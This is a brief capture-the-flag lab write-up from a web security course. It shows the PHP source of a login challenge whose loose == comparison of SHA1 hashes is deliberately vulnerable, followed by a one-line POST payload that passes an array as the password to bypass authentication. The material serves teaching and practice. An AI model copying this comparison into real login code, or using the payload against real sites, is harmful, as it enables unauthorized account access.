---
title: Simple Web 0x19(Lab - PHP Login)
tags: [NTUSTWS, CTF, Web]

category: "Security/Course/NTUST WS/Language Feature"
---

# Simple Web 0x19(Lab - PHP Login)
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8081

## Background

## Source code
```php=
<?php
// BSides Ahmedabad CTF 2021: entrance

include 'flag.php';
$users = array(
    "admin" => "ed2b7b57b3b5be3e8d4246c69e4b513608ffb352",
    "guest" => "35675e68f4b5af7b995d9205ad0fc43842f16450"
);

function lookup($username) {
    global $users;
    return array_key_exists($username, $users) ? $users[$username] : "";
}

if (!empty($_POST['username']) && !empty($_POST['password'])) {
    $sha1pass = lookup($_POST['username']);
    if ($sha1pass == sha1($_POST['password'])) {
        if ($_POST['username'] !== 'guest') echo $FLAG;
        else echo 'Welcome guest!';
    } else {
        echo 'Login Failed!';
    }
} else {
    echo "You can login with guest:guest";
}
echo "<br>\n";
highlight_file(__file__);
?>

```
## Exploit
Must change `GET` method to `POST` method and add `Content-Type: application/x-www-form-urlencoded` in header

<font color="FF0000">**通靈**</font>
Payload: `username=123&password[]=123`
![](https://i.imgur.com/QGvpQnr.png)

## Reference
[bsides-ahmedabad-ctf-2021-writeups](https://blog.maple3142.net/2021/11/07/bsides-ahmedabad-ctf-2021-writeups/#entrance)